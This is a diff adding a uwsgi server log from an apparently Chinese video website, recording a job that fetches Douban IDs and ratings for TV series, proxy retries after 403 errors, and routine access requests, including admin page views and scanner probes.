@@ -1,0 +1,1578 @@
+[1591891202] ./uwsgi.log reopened.
+昨晚过得很愉快吧 30371813 保存成功[douban]
+独家记忆 匹配到多个豆瓣id数据，存入列表2 ['30196806', '30466832', '30466831', '30466833']
+绝世千金第二季 30470099 保存成功[douban]
+我和我的儿女们 30166922 保存成功[douban]
+生日信 34816454 保存成功[douban]
+包豪斯时代第一季 34843133 保存成功[douban]
+很便宜，千里马超市 33457604 保存成功[douban]
+爱就要报复回来 30438057 保存成功[douban]
+惩罚者第二季 8.2 保存成功[rating]
+想被疗愈的男人 30451873 保存成功[douban]
+苦力 34778277 保存成功[douban]
+九州缥缈录 26738112 保存成功[douban]
+我们这一天第四季 9.5 保存成功[rating]
+融和不容易第一季 7.7 保存成功[rating]
+芝加哥烈焰第八季 8.7 保存成功[rating]
+警视厅零系第四季 33425325 保存成功[douban]
+时效警察开始了 30425902 7.4保存成功[douban]
+甲子园与老婆婆与炸弹锅 6.1 保存成功[rating]
+美国佬第一季 33397764 保存成功[douban]
+浴血黑帮第五季 9.3 保存成功[rating]
+用九柑仔店 33446576 保存成功[douban]
+这个不可以报销！ 33468413 保存成功[douban]
+棋盘上的向日葵 8.0 保存成功[rating]
+不负时光 27052169 保存成功[douban]
+国家孩子 7.3 保存成功[rating]
+亲·爱的味道 26811784 保存成功[douban]
+你是我的答案 30211705 保存成功[douban]
+杰克·莱恩第二季 30205129 保存成功[douban]
+晚安，对岸再会 6.6 保存成功[rating]
+生活对我下手了2 33446543 保存成功[douban]
+爱的着陆 匹配到多个豆瓣id数据，存入列表2 ['30488510', '34880955']
+一人露营 8.3 保存成功[rating]
+狄金森第一季 8.2 保存成功[rating]
+此情不待 4.7 保存成功[rating]
+爱恨之火 34851312 保存成功[douban]
+高堡奇人第四季 7.4 保存成功[rating]
+海上谋杀案第二季 7.2 保存成功[rating]
+绿豆传 7.3 保存成功[rating]
+海棠经雨胭脂透 5.8 保存成功[rating]
+最强联盟 34446034 保存成功[douban]
+偶然发现的一天 33446363 保存成功[douban]
+辅佐官2：改变世界的人们 9.0 保存成功[rating]
+选拔屋～猎头的做派～ 6.4 保存成功[rating]
+幸福衰生活第一季 8.3 保存成功[rating]
+紧急呼救第三季 34795572 9.0保存成功[douban]
+都是一家人 27663763 保存成功[douban]
+Re:Follower 34825995 保存成功[douban]
+神兽第一季 7.3 保存成功[rating]
+安宁之刻～道 8.3 保存成功[rating]
+优雅的母女 5.4 保存成功[rating]
+极道千金 30373954 5.8保存成功[douban]
+百分之十第三季 8.8 保存成功[rating]
+X医生：外科医生大门未知子第6季 33413854 保存成功[douban]
+电影少女2018 6.7 保存成功[rating]
+嘻哈帝国第六季 33445454 保存成功[douban]
+喜新不厌旧第六季 34841044 保存成功[douban]
+火星时代第二季 9.0 保存成功[rating]
+春暖花又开 3.8 保存成功[rating]
+追查第二章 6.5 保存成功[rating]
+真爱墨菲定律 30486906 保存成功[douban]
+身为一个胖子 33425608 保存成功[douban]
+牧场趣事第三季 8.4 保存成功[rating]
+胖妞星探第三季 34678378 保存成功[douban]
+我不会让给你 4.8 保存成功[rating]
+天坑鹰猎 7.6 保存成功[rating]
+了不起的麦瑟尔夫人第二季 8.7 保存成功[rating]
+萨布丽娜的惊心冒险第一季 7.0 保存成功[rating]
+节哀顺变第一季 7.0 保存成功[rating]
+[pid: 10432|app: 0|req: 33/40] 113.69.35.228 () {42 vars in 857 bytes} [Fri Jun 12 00:20:26 2020] GET /video/type/17/?&page=7 => generated 31301 bytes in 168 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 34/41] 113.69.35.228 () {42 vars in 857 bytes} [Fri Jun 12 00:20:29 2020] GET /admin/view_log/?page=8 => generated 0 bytes in 8 msecs (HTTP/1.1 302) 6 headers in 180 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 35/42] 113.69.35.228 () {42 vars in 846 bytes} [Fri Jun 12 00:20:29 2020] GET /admin/login.html => generated 5348 bytes in 9 msecs (HTTP/1.1 200) 6 headers in 319 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 36/43] 113.69.35.228 () {42 vars in 846 bytes} [Fri Jun 12 00:21:14 2020] GET /admin/login.html => generated 5348 bytes in 1 msecs (HTTP/1.1 200) 6 headers in 319 bytes (1 switches on core 0)
+凉生，我们可不可以不忧伤 26774173 保存成功[douban]
+[pid: 10432|app: 0|req: 37/44] 113.69.35.228 () {42 vars in 857 bytes} [Fri Jun 12 00:21:15 2020] GET /admin/view_log/?page=8 => generated 0 bytes in 1 msecs (HTTP/1.1 302) 6 headers in 180 bytes (1 switches on core 1)
+[pid: 10433|app: 0|req: 4/45] 113.69.35.228 () {42 vars in 846 bytes} [Fri Jun 12 00:21:15 2020] GET /admin/login.html => generated 5348 bytes in 2 msecs (HTTP/1.1 200) 6 headers in 319 bytes (1 switches on core 0)
+[pid: 10433|app: 0|req: 5/46] 113.69.35.228 () {42 vars in 857 bytes} [Fri Jun 12 00:21:17 2020] GET /admin/view_log/?page=3 => generated 0 bytes in 10 msecs (HTTP/1.1 302) 6 headers in 180 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 38/47] 113.69.35.228 () {42 vars in 846 bytes} [Fri Jun 12 00:21:17 2020] GET /admin/login.html => generated 5348 bytes in 1 msecs (HTTP/1.1 200) 6 headers in 319 bytes (1 switches on core 0)
+[pid: 10433|app: 0|req: 6/48] 113.69.35.228 () {42 vars in 857 bytes} [Fri Jun 12 00:21:18 2020] GET /admin/view_log/?page=4 => generated 0 bytes in 1 msecs (HTTP/1.1 302) 6 headers in 180 bytes (1 switches on core 0)
+[pid: 10431|app: 0|req: 5/49] 113.69.35.228 () {42 vars in 846 bytes} [Fri Jun 12 00:21:18 2020] GET /admin/login.html => generated 5348 bytes in 12 msecs (HTTP/1.1 200) 6 headers in 319 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 39/50] 113.69.35.228 () {42 vars in 857 bytes} [Fri Jun 12 00:21:22 2020] GET /video/type/17/?&page=7 => generated 31301 bytes in 169 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 1)
+[pid: 10431|app: 0|req: 6/51] 113.69.35.228 () {42 vars in 857 bytes} [Fri Jun 12 00:21:35 2020] GET /admin/view_log/?page=3 => generated 0 bytes in 10 msecs (HTTP/1.1 302) 6 headers in 180 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 40/52] 113.69.35.228 () {42 vars in 846 bytes} [Fri Jun 12 00:21:35 2020] GET /admin/login.html => generated 5348 bytes in 1 msecs (HTTP/1.1 200) 6 headers in 319 bytes (1 switches on core 0)
+狐狸新娘星 28509671 保存成功[douban]
+[pid: 10432|app: 0|req: 41/53] 113.69.35.228 () {50 vars in 1068 bytes} [Fri Jun 12 00:21:44 2020] POST /admin/login.html => generated 63 bytes in 4 msecs (HTTP/1.1 200) 6 headers in 294 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 42/54] 113.69.35.228 () {44 vars in 923 bytes} [Fri Jun 12 00:21:44 2020] GET /admin/ => generated 30034 bytes in 2 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+爱情的边疆 6.8 保存成功[rating]
+[pid: 10432|app: 0|req: 43/55] 113.69.35.228 () {44 vars in 931 bytes} [Fri Jun 12 00:21:48 2020] GET /admin/view_log/ => generated 20453 bytes in 3 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 44/56] 113.69.35.228 () {44 vars in 960 bytes} [Fri Jun 12 00:22:14 2020] GET /admin/view_log/2020-06-11 => generated 0 bytes in 0 msecs (HTTP/1.1 301) 4 headers in 165 bytes (1 switches on core 0)
+[pid: 10433|app: 0|req: 7/57] 113.69.35.228 () {44 vars in 962 bytes} [Fri Jun 12 00:22:14 2020] GET /admin/view_log/2020-06-11/ => generated 23170 bytes in 61 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 45/58] 113.69.35.228 () {44 vars in 988 bytes} [Fri Jun 12 00:22:18 2020] GET /admin/view_log/2020-06-11/?page=16 => generated 18814 bytes in 62 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 1)
+[pid: 10433|app: 0|req: 8/59] 113.69.35.228 () {44 vars in 959 bytes} [Fri Jun 12 00:22:34 2020] GET /admin/view_log/ => generated 20627 bytes in 4 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 1)
+初婚 2.8 保存成功[rating]
+我与尾巴与神乐坂 30262247 7.5保存成功[douban]
+游泳先生 26857688 1006的房客 7.8 保存成功[rating]
+保存成功[douban]
+啦啦队之舞 27021210 保存成功[douban]
+医妃难囚 30234334 保存成功[douban]
+颤抖吧阿部之朵星风云 30241701 保存成功[douban]
+圣哥传 26919426 保存成功[douban]
+球手们第四季 27108484 保存成功[douban]
+生存结婚 30232262 保存成功[douban]
+黑色警报第三季 27044141 狂赌之渊 真人电视剧版 7.8 保存成功[rating]
+保存成功[douban]
+十二猴子第四季 27059293 保存成功[douban]
+鲁保罗变装皇后秀 第十季 30161318 保存成功[douban]
+11月13日：巴黎恐怖袭击第一季 30229676 保存成功[douban]
+软饭男 30238439 保存成功[douban]
+真的要去航海第二季 30252336 保存成功[douban]
+幸福就好 20256512 保存成功[douban]
+你也是人类吗? 26951618 8.4保存成功[douban]
+越路吹雪物语 27203606 保存成功[douban]
+监査人野崎修平 6.8 保存成功[rating]
+零异频道 第三季 7.1 保存成功[rating]
+谍网第三季 27044881 5.8保存成功[douban]
+[pid: 10432|app: 0|req: 46/60] 223.71.167.163 () {34 vars in 459 bytes} [Fri Jun 12 00:30:41 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+禁忌女孩 8.4 保存成功[rating]
+大祸临头第三季 8.3 保存成功[rating]
+proxy: 58.220.95.114:10053 Status Code： 403 重试
+誓言 第一季 27026045 保存成功[douban]
+鬼玩人 第三季 26891592 保存成功[douban]
+婚姻历险记 3.9 保存成功[rating]
+小戏骨：水浒传 26953998 保存成功[douban]
+警犬来啦 26972554 保存成功[douban]
+韦科惨案 26901427 保存成功[douban]
+诈欺担保人 第二季 27079601 保存成功[douban]
+帆船少女号 30327359 保存成功[douban]
+环球广告社推销你的人生 27130442 保存成功[douban]
+骑士陨落 第一季 26705544 6.7保存成功[douban]
+大城小妞 第四季 26703445 保存成功[douban]
+流星花园 8.2 保存成功[rating]
+唇膏 8.7 保存成功[rating]
+霹雳菩萨 6.9 保存成功[rating]
+等着你回来 7.9 保存成功[rating]
+十三号星期五3 6.1 保存成功[rating]
+————————豆瓣评分数据更新完毕————————
+[pid: 10430|app: 0|req: 2/61] 113.69.35.228 () {46 vars in 873 bytes} [Thu Jun 11 23:40:19 2020] GET /admin/update_rating/ => generated 4 bytes in 5300732 msecs (HTTP/1.1 200) 5 headers in 148 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 47/62] 182.254.52.17 () {36 vars in 582 bytes} [Fri Jun 12 01:47:23 2020] GET /view_log/2020-06-11/ => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10430|app: 0|req: 3/63] 182.254.52.17 () {36 vars in 594 bytes} [Fri Jun 12 01:47:37 2020] GET /admin/view_log/2020-06-11/ => generated 0 bytes in 11 msecs (HTTP/1.1 302) 6 headers in 180 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 48/64] 182.254.52.17 () {38 vars in 637 bytes} [Fri Jun 12 01:47:37 2020] GET /admin/login.html => generated 5348 bytes in 1 msecs (HTTP/1.1 200) 6 headers in 319 bytes (1 switches on core 0)
+proxy: 153.35.185.71:18000 Status Code： 403 重试
+[pid: 10432|app: 0|req: 49/65] 182.254.52.17 () {36 vars in 576 bytes} [Fri Jun 12 02:07:28 2020] GET /video/play/66251/ => generated 13282 bytes in 5 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 1)
+[pid: 10430|app: 0|req: 4/66] 182.254.52.17 () {36 vars in 594 bytes} [Fri Jun 12 02:14:39 2020] GET /admin/view_log/2020-06-10/ => generated 0 bytes in 0 msecs (HTTP/1.1 302) 6 headers in 180 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 50/67] 182.254.52.17 () {38 vars in 637 bytes} [Fri Jun 12 02:14:39 2020] GET /admin/login.html => generated 5348 bytes in 1 msecs (HTTP/1.1 200) 6 headers in 319 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 51/68] 182.254.52.17 () {36 vars in 589 bytes} [Fri Jun 12 02:18:15 2020] GET /admin/view_log/?page%3D2 => generated 0 bytes in 1 msecs (HTTP/1.1 302) 6 headers in 180 bytes (1 switches on core 1)
+[pid: 10433|app: 0|req: 9/69] 182.254.52.17 () {38 vars in 635 bytes} [Fri Jun 12 02:18:15 2020] GET /admin/login.html => generated 5348 bytes in 1 msecs (HTTP/1.1 200) 6 headers in 319 bytes (1 switches on core 0)
+[pid: 10430|app: 0|req: 5/70] 45.148.10.74 () {34 vars in 498 bytes} [Fri Jun 12 02:24:06 2020] GET / => generated 179 bytes in 9 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10430|app: 0|req: 6/71] 59.36.132.240 () {36 vars in 589 bytes} [Fri Jun 12 02:25:57 2020] GET /admin/view_log/?page%3D4 => generated 0 bytes in 1 msecs (HTTP/1.1 302) 6 headers in 180 bytes (1 switches on core 1)
+[pid: 10433|app: 0|req: 10/72] 59.36.132.240 () {38 vars in 635 bytes} [Fri Jun 12 02:25:57 2020] GET /admin/login.html => generated 5348 bytes in 1 msecs (HTTP/1.1 200) 6 headers in 319 bytes (1 switches on core 1)
+[pid: 10430|app: 0|req: 7/73] 182.254.52.17 () {36 vars in 554 bytes} [Fri Jun 12 02:27:03 2020] GET /video/ => generated 59285 bytes in 387 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 1)
+[pid: 10430|app: 0|req: 8/74] 128.14.134.134 () {34 vars in 488 bytes} [Fri Jun 12 02:28:41 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+————————豆瓣id获取完毕————————
+[pid: 10430|app: 0|req: 8/75] 113.69.35.228 () {46 vars in 867 bytes} [Thu Jun 11 23:40:16 2020] GET /admin/get_rating/ => generated 4 bytes in 10242909 msecs (HTTP/1.1 200) 5 headers in 148 bytes (1 switches on core 0)
+[pid: 10430|app: 0|req: 9/76] 182.254.52.17 () {36 vars in 592 bytes} [Fri Jun 12 02:33:40 2020] GET /admin/view_log/2020-06-10 => generated 0 bytes in 0 msecs (HTTP/1.1 301) 4 headers in 165 bytes (1 switches on core 1)
+[pid: 10433|app: 0|req: 11/77] 182.254.52.17 () {38 vars in 656 bytes} [Fri Jun 12 02:33:40 2020] GET /admin/view_log/2020-06-10/ => generated 0 bytes in 0 msecs (HTTP/1.1 302) 6 headers in 180 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 52/78] 182.254.52.17 () {38 vars in 637 bytes} [Fri Jun 12 02:33:40 2020] GET /admin/login.html => generated 5348 bytes in 1 msecs (HTTP/1.1 200) 6 headers in 319 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 53/79] 58.247.212.239 () {36 vars in 577 bytes} [Fri Jun 12 03:01:33 2020] GET /video/play/85163/ => generated 15241 bytes in 5 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 1)
+[pid: 10430|app: 0|req: 10/80] 182.254.52.17 () {36 vars in 522 bytes} [Fri Jun 12 03:08:07 2020] GET /video/play/81467/ => generated 15301 bytes in 10 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 54/81] 95.165.218.102 () {32 vars in 465 bytes} [Fri Jun 12 03:10:46 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 55/82] 59.36.132.240 () {36 vars in 568 bytes} [Fri Jun 12 03:14:49 2020] GET /video/type/2/ => generated 37994 bytes in 164 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 56/83] 182.254.52.17 () {36 vars in 576 bytes} [Fri Jun 12 03:21:10 2020] GET /video/play/32439/ => generated 13578 bytes in 4 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 57/84] 182.254.52.17 () {36 vars in 582 bytes} [Fri Jun 12 03:27:56 2020] GET /admin/update_rating/ => generated 0 bytes in 1 msecs (HTTP/1.1 302) 6 headers in 180 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 58/85] 182.254.52.17 () {38 vars in 631 bytes} [Fri Jun 12 03:27:56 2020] GET /admin/login.html => generated 5348 bytes in 1 msecs (HTTP/1.1 200) 6 headers in 319 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 59/86] 182.254.52.17 () {36 vars in 633 bytes} [Fri Jun 12 03:28:05 2020] GET /video/type/2/?year%3D%26area%3D%26rating%3D9.0 => generated 37994 bytes in 173 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 60/87] 182.254.52.17 () {36 vars in 576 bytes} [Fri Jun 12 03:54:37 2020] GET /video/play/84572/ => generated 13715 bytes in 5 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 61/88] 101.89.19.140 () {36 vars in 576 bytes} [Fri Jun 12 03:54:47 2020] GET /video/play/85100/ => generated 13907 bytes in 5 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 62/89] 128.14.209.178 () {34 vars in 488 bytes} [Fri Jun 12 03:57:46 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 63/90] 182.254.52.17 () {36 vars in 592 bytes} [Fri Jun 12 04:01:04 2020] GET /video/play/66045/1-1.html => generated 13282 bytes in 5 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 64/91] 14.18.182.223 () {36 vars in 576 bytes} [Fri Jun 12 04:07:53 2020] GET /video/play/65327/ => generated 13358 bytes in 5 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 65/92] 182.254.52.17 () {36 vars in 592 bytes} [Fri Jun 12 04:14:32 2020] GET /video/play/65721/1-1.html => generated 13282 bytes in 5 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 66/93] 37.156.126.138 () {32 vars in 465 bytes} [Fri Jun 12 04:17:00 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 67/94] 116.128.128.41 () {36 vars in 543 bytes} [Fri Jun 12 04:41:29 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 68/95] 61.241.50.63 () {36 vars in 575 bytes} [Fri Jun 12 04:54:12 2020] GET /video/play/66255/ => generated 13282 bytes in 7 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 69/96] 162.243.139.170 () {34 vars in 407 bytes} [Fri Jun 12 05:00:56 2020] GET /hudson => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 70/97] 61.241.50.63 () {36 vars in 592 bytes} [Fri Jun 12 05:27:33 2020] GET /video/type/16/?%26page%3D4 => generated 29042 bytes in 155 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 71/98] 61.241.50.63 () {36 vars in 591 bytes} [Fri Jun 12 05:27:37 2020] GET /video/play/66251/1-1.html => generated 13282 bytes in 5 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 72/99] 182.254.52.17 () {36 vars in 576 bytes} [Fri Jun 12 05:34:43 2020] GET /video/play/87962/ => generated 14519 bytes in 5 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 73/100] 182.254.52.17 () {36 vars in 568 bytes} [Fri Jun 12 05:47:23 2020] GET /video/type/3/ => generated 34008 bytes in 111 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 74/101] 182.254.52.17 () {36 vars in 589 bytes} [Fri Jun 12 06:01:01 2020] GET /admin/view_log/?page%3D3 => generated 0 bytes in 1 msecs (HTTP/1.1 302) 6 headers in 180 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 75/102] 182.254.52.17 () {38 vars in 635 bytes} [Fri Jun 12 06:01:01 2020] GET /admin/login.html => generated 5348 bytes in 1 msecs (HTTP/1.1 200) 6 headers in 319 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 76/103] 182.254.52.17 () {36 vars in 576 bytes} [Fri Jun 12 06:01:18 2020] GET /video/play/87645/ => generated 14040 bytes in 5 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 77/104] 182.254.52.17 () {36 vars in 589 bytes} [Fri Jun 12 06:14:32 2020] GET /admin/view_log/?page%3D5 => generated 0 bytes in 1 msecs (HTTP/1.1 302) 6 headers in 180 bytes (1 switches on core 1)
+[pid: 10433|app: 0|req: 12/105] 182.254.52.17 () {38 vars in 635 bytes} [Fri Jun 12 06:14:32 2020] GET /admin/login.html => generated 5348 bytes in 1 msecs (HTTP/1.1 200) 6 headers in 319 bytes (1 switches on core 0)
+[pid: 10433|app: 0|req: 13/106] 182.254.52.17 () {36 vars in 535 bytes} [Fri Jun 12 06:28:02 2020] GET /admin/view_log/?page%3D7 => generated 0 bytes in 0 msecs (HTTP/1.1 302) 6 headers in 180 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 78/107] 182.254.52.17 () {38 vars in 581 bytes} [Fri Jun 12 06:28:02 2020] GET /admin/login.html => generated 5348 bytes in 1 msecs (HTTP/1.1 200) 6 headers in 319 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 79/108] 59.36.132.240 () {36 vars in 576 bytes} [Fri Jun 12 06:42:10 2020] GET /video/play/65480/ => generated 13282 bytes in 4 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 80/109] 193.118.53.194 () {34 vars in 488 bytes} [Fri Jun 12 07:15:35 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 81/110] 80.181.173.205 () {32 vars in 464 bytes} [Fri Jun 12 07:50:44 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 82/111] 113.69.35.228 () {42 vars in 888 bytes} [Fri Jun 12 07:57:49 2020] GET /admin/view_log/ => generated 21421 bytes in 5 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 83/112] 113.69.35.228 () {44 vars in 953 bytes} [Fri Jun 12 07:58:06 2020] GET /admin/view_log/?page=2 => generated 19633 bytes in 6 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 84/113] 113.69.35.228 () {44 vars in 929 bytes} [Fri Jun 12 07:58:14 2020] GET /admin/ => generated 30034 bytes in 2 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+————————开始获取豆瓣id数据————————
+无豆瓣id的视频总数：5498
+无匹配视频总数：2430
+重复数据的视频总数：584
+[pid: 10432|app: 0|req: 86/114] 113.69.35.228 () {44 vars in 931 bytes} [Fri Jun 12 07:58:17 2020] GET /admin/view_log/ => generated 21421 bytes in 6 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 0)
+[pid: 10430|app: 0|req: 11/115] 113.69.35.228 () {44 vars in 953 bytes} [Fri Jun 12 07:58:21 2020] GET /admin/view_log/?page=2 => generated 19947 bytes in 14 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 0)
+proxy: 121.69.26.14:8080 Status Code： 403 重试
+proxy: 1.119.166.180:8080 Status Code： 403 重试
+proxy: 58.220.95.55:9400 Status Code： 403 重试
+[pid: 10430|app: 0|req: 12/116] 88.224.66.242 () {32 vars in 470 bytes} [Fri Jun 12 07:58:46 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+proxy: 58.220.95.79:10000 Status Code： 403 重试
+proxy: 221.122.91.61:80 Status Code： 403 重试
+人气女神~拉面食游记~ 34964059 保存成功[douban]
+初三、冬、逃亡中 34995724 保存成功[douban]
+[pid: 10432|app: 0|req: 87/117] 168.232.15.162 () {32 vars in 464 bytes} [Fri Jun 12 08:07:20 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+三人贫第一季 34888419 保存成功[douban]
+野兽家族第四季 30483344 保存成功[douban]
+欢乐南极厨 30400834 保存成功[douban]
+初恋那一天所读的故事 30335661 保存成功[douban]
+请再来四杯第一季 30454836 保存成功[douban]
+黑色星期一第一季 27135496 保存成功[douban]
+彼此的心意 33385456 保存成功[douban]
+最后一个女神 33371773 保存成功[douban]
+萤草 菜菜的剑 33426376 保存成功[douban]
+命悬一线的浪漫 34807466 保存成功[douban]
+阴差阳错第三季 34809262 保存成功[douban]
+伪钞者之末路 30371543 保存成功[douban]
+东京大饭店~平古祥平摇摆的心 34906640 保存成功[douban]
+战火浮生第一季 27163288 保存成功[douban]
+黑金高墙第二季 33429431 保存成功[douban]
+你是我的奇迹 34904974 保存成功[douban]
+金色丈夫 34458907 保存成功[douban]
+莉香 34810453 保存成功[douban]
+Miss事故调～天才‧天之教授的调查档案～ 34607540 保存成功[douban]
+繁文琐事第二季 30454234 保存成功[douban]
+想在京都小住。 34906732 保存成功[douban]
+里克斯坦的秘密法国第一季 34931887 保存成功[douban]
+性爱自修室第一季 27594217 保存成功[douban]
+一夜暴福 30372299 保存成功[douban]
+锦衣之下 匹配到多个豆瓣id数据，存入列表2 ['27107123', '30465870', '30465958', '30465959']
+星途叵测2 34868322 保存成功[douban]
+黑色童话第一季 27594878 保存成功[douban]
+许你浮生若梦 27083552 保存成功[douban]
+夜天子 27005229 保存成功[douban]
+杨光的快乐生活之恋爱先生 30486682 保存成功[douban]
+幸色的一居室 30175310 保存成功[douban]
+谁说理科生不懂爱情 30148178 4.9保存成功[douban]
+高堡奇人第三季 26948407 8.3保存成功[douban]
+认识的妻子 30156096 保存成功[douban]
+那抹属于我的星光 27194537 保存成功[douban]
+炮灰攻略 30188117 保存成功[douban]
+时尚之王国王的权杖 30299342 保存成功[douban]
+秃鹫 30238453 保存成功[douban]
+生死狙击第三季 27598384 7.0保存成功[douban]
+爱国者 匹配到多个豆瓣id数据，存入列表2 ['27005238', '27025472']
+EERIE~看不见的脸 30203507 保存成功[douban]
+离别已离别 30185462 保存成功[douban]
+黑钱第一季 27664017 保存成功[douban]
+岌岌可危酒店！ 30132549 保存成功[douban]
+孤独的美食家第七季 30157139 保存成功[douban]
+有家可归的恋人们 30141746 保存成功[douban]
+致命X 30373767 保存成功[douban]
+汉摩拉比小姐 30128988 保存成功[douban]
+真正的脑洞 30241539 保存成功[douban]
+放学后恋爱 匹配到多个豆瓣id数据，存入列表2 ['30214024', '30313851']
+黑色止血钳 30135594 保存成功[douban]
+也许曾经能做到委员会 30176805 保存成功[douban]
+女神缔造者 30246467 保存成功[douban]
+善良魔女传 27613143 保存成功[douban]
+镜花水月第三季 26808915 保存成功[douban]
+蜀山战纪2踏火行歌 26901397 保存成功[douban]
+萌妻食神 匹配到多个豆瓣id数据，存入列表2 ['27015980', '30395527']
+正义之凛 30037126 保存成功[douban]
+爱情重跑 30161256 保存成功[douban]
+我是僵尸 第四季 27041240 保存成功[douban]
+青春崛起 26966823 保存成功[douban]
+我的隐形男友 30217541 保存成功[douban]
+Switch-改变世界 27663988 保存成功[douban]
+爱情代替套路 30157152 保存成功[douban]
+迷雾 27097811 7.3保存成功[douban]
+继承者计划 26979216 保存成功[douban]
+毕业笨蛋实况 27191438 保存成功[douban]
+家族的旅途 27591196 保存成功[douban]
+防水逆联盟 匹配到多个豆瓣id数据，存入列表2 ['30414324', '26873733']
+整容的诱惑 30175264 保存成功[douban]
+总觉得邻家更幸福 27194984 保存成功[douban]
+台湾往事 27053244 保存成功[douban]
+美国犯罪故事 第二季 26896001 8.5保存成功[douban]
+内衣先生 27148204 保存成功[douban]
+女子的生活 27192250 保存成功[douban]
+酷玩乐队：满脑子的梦想 30349240 保存成功[douban]
+[pid: 10432|app: 0|req: 88/118] 183.136.225.57 () {34 vars in 456 bytes} [Fri Jun 12 09:26:39 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+proxy: 58.220.95.78:9401 Status Code： 403 重试
+托洛茨基 27192891 保存成功[douban]
+proxy: 221.122.91.64:80 Status Code： 403 重试
+追查 第一章 27180764 保存成功[douban]
